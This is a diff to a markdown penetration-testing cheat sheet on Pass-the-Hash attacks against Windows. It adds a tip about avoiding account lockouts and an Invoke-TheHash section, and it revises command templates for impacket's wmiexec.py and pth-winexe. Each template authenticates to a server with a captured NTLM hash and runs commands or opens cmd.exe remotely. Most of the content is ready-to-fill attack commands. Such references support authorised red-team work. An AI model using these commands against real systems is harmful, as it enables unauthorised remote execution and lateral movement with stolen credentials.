@@ -5,6 +5,8 @@ You can use many many tools to perform PtH. The only required things are:
 * A username (and its domain if not local...)
 * Its NTLM hash
 
+Do not forget to analyze the [password policy](PasspolAuditing.md), you could block accounts! Be smart...
+
 ## Mimikatz
 ### Original binary
 ```
@@ -64,9 +66,22 @@ https://github.com/CoreSecurity/impacket/
 
 Example:
 ```
-python wmiexec.py -hashes :<ntlm> <user>@<server_fqdn>
+python wmiexec.py -hashes :<ntlm> <user>@<server>
 ```
 > Impacket examples for Windows: https://github.com/maaaaz/impacket-examples-windows
+
+## Invoke-TheHash
+https://github.com/Kevin-Robertson/Invoke-TheHash
+* Invoke-WMIExec
+* Invoke-SMBExec
+* Invoke-SMBEnum
+* Invoke-SMBClient
+* Invoke-TheHash
+
+Example:
+```
+Invoke-WMIExec -Target <server> -Domain <domain> -Username <user> -Hash <NTLM> -Command <command_or_binary>
+```
 
 ## pth-toolkit
 * pth-net
@@ -80,7 +95,7 @@ python wmiexec.py -hashes :<ntlm> <user>@<server_fqdn>
 
 Example:
 ```
-pth-winexe -U <domain>/<user>%h<LM>:<NTLM> //<server_fqdn> cmd.exe
+pth-winexe -U <domain>/<user>%h<LM>:<NTLM> //<server> cmd.exe
 ```
 
 ## Empire
